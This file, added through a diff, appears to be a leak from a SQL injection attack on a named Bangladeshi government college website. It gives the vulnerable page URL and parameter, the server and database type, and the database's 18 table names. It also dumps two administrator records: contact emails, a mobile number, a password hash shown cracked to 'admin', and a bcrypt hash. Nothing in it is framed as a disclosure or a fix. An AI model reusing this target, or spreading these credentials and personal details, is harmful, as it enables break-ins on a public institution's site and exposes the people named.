@@ -1,0 +1,54 @@
+.gov Government
+
+.bd Bangladesh
+
+Noakhalı Government College
+
+http://www.noakhalicoll.gov.bd/page.php?id=15
+
+web application technology: Apache
+the back-end DBMS: MySQL 5
+
+available databases [1]:
+[+] noakhali_i17
+
+Database: noakhali_i17
+[18 tables]
++--------------------------+
+| admin                    |
+| contact                  |
+| department               |
+| external_link            |
+| library                  |
+| menu                     |
+| page                     |
+| photo_album              |
+| photos                   |
+| scroller                 |
+| site                     |
+| slider                   |
+| students                 |
+| students_attendance      |
+| tbl_admin                |
+| teacher_staff            |
+| teacher_staff_attendance |
+| videos                   |
++--------------------------+
+
+Database: noakhali_i17                                                                                                                                               
+Table: admin
+[1 entry]
++-----------+-----------------+------------------------------------------+
+| fullname  | email           | password                                 |
++-----------+-----------------+------------------------------------------+
+| Principal | admin@admin.com | 21232f297a57a5a743894a0e4a801fc3 (admin) |
++-----------+-----------------+------------------------------------------+
+
+Database: noakhali_i17
+Table: tbl_admin
+[1 entry]
++----------+------------+-------------------------+--------------------------------------------------------------+
+| fullname | mobile     | email                   | password                                                     |
++----------+------------+-------------------------+--------------------------------------------------------------+
+| Admin    | 1710676814 | ngc_principal@yahoo.com | $2y$10$RB/ku5GdkP5DnKwn7oGKXe7S7wCsOgtpxKW0wWNzsBhYsVy9VSj6W |
++----------+------------+-------------------------+--------------------------------------------------------------+
